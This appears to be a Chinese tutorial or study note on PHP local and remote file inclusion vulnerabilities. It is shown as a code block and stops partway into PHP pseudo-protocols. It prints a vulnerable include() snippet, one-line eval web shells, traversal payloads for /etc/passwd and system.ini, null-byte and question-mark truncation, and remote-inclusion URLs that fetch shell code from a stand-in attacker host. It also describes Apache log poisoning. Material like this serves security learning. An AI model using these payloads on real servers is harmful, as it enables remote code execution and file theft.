  <article class="passage-article">
    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"> 文件包含</span><br><span class="line"></span><br><span class="line">包含文件的函数</span><br><span class="line"></span><br><span class="line">1.include()</span><br><span class="line"></span><br><span class="line">2.include_once()</span><br><span class="line"></span><br><span class="line">3.require()</span><br><span class="line"></span><br><span class="line">4.require_once()</span><br><span class="line"></span><br><span class="line">代码审计的时候，是否是变量，不过滤，过滤不严格，函数include/require</span><br><span class="line">远程文件包含和本地文件包含的配置区别</span><br><span class="line"></span><br><span class="line">本地文件包含php.ini配置文件中开启allow_url_include</span><br><span class="line">远程文件包含与本地文件包含的区别（开启allow_url_include和allow_url—ftp on）</span><br><span class="line"></span><br><span class="line">远程文件(包括本地文件包含)包含比本地文件包含的危害大</span><br><span class="line"></span><br><span class="line">本地文件包含利用</span><br><span class="line">示例代码</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$filename = $_GET[‘filename’];</span><br><span class="line">include($filename);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line"></span><br><span class="line">$_GET[‘filename’]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改$_GET[‘filename’]的值，执行非预期的操作。</span><br><span class="line"></span><br><span class="line">如果存在本地文件包含漏洞时，不论包含 txt 还是 jpg，程序都会以 php 来解析运行，也就意味着可以上传一句话木马，直接用菜刀连接。</span><br><span class="line"></span><br><span class="line">例如新建一个 1.txt 内容为：</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[‘caidao’]);?&gt;</span><br><span class="line"></span><br><span class="line">随后将后缀改为 jpg，利用文件包含漏洞包含此文件</span><br><span class="line"></span><br><span class="line">格式举例</span><br><span class="line"></span><br><span class="line">本地文件包含就是通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤允许遍历目录的字符注入浏览器并执行。</span><br><span class="line"></span><br><span class="line">在路径后添加%00，如：?filename=../../../../etc/password%00</span><br><span class="line"></span><br><span class="line">?Filename=C:\WINDOWS\system.ini。</span><br><span class="line"></span><br><span class="line">问号截断</span><br><span class="line"></span><br><span class="line">路径长度截断</span><br><span class="line">条件：windows OS，点号需要长于256；linux OS 长于4096</span><br><span class="line"></span><br><span class="line">Windows下目录最大长度为256字节，超出的部分会被丢弃；</span><br><span class="line"></span><br><span class="line">Linux下目录最大长度为4096字节，超出的部分会被丢弃。</span><br><span class="line"></span><br><span class="line">如果PHP的配置选项allow_url_include为ON的话，则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞。</span><br><span class="line"></span><br><span class="line">require_once $basePath . ‘/action/m_share.php’</span><br><span class="line"></span><br><span class="line">攻击者可以构造如下的攻击URL /?param=http://attacker/phpshell.txt?</span><br><span class="line">最终加载的代码实际上执行了 require_once ‘http://attacker/phpshell.txt?/action/m_share.php&apos;</span><br><span class="line">问号后面的代码被解释成URL的querystring，也是一种“截断”，这是在利用远程文件包含漏洞时的常见技巧。同样的，%00也可以用做截断符号。</span><br><span class="line"></span><br><span class="line">如果目标主机allow_url_fopen选项是激活的，就可以尝试远程包含一句话木马，如：http://www.attacker.com/echo.txt，代码如下：</span><br><span class="line">&lt;?php fputs(fopen(“shell.php”,”w”),”&lt;?php eval(\$_POST[xxser]);?&gt;”);?&gt;</span><br><span class="line">访问：http://www.example.com/index.php?page=http://www.attacker.com/echo.txt。将会在index.php所在的目录下生成shell.php，内容为：</span><br><span class="line">&lt;?php eval($_POST[xxser]);?&gt;</span><br><span class="line"></span><br><span class="line">包含Apache日志文件</span><br><span class="line">本地文件包含的利用。</span><br><span class="line">Apache有两个日志文件：access.log（访问日志）和error.log（错误日志）。</span><br><span class="line">攻击者先访问http://www.example.com/&lt;?php phpinfo();?&gt;,操作这一步时，需要Burp，否则&lt;,&gt;,空格都会被转码。</span><br><span class="line">随后访问http://www.xxser.com/index.php?page=./../Apache-20/logs/access.log</span><br><span class="line">使用这种方式时，找到Apache的路径是关键。</span><br><span class="line"></span><br><span class="line">PHP伪协议</span><br><span class="line">php://filter（本地磁盘文件进行读取）</span><br><span class="line">条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</span><br></pre></td></tr></table></figure>
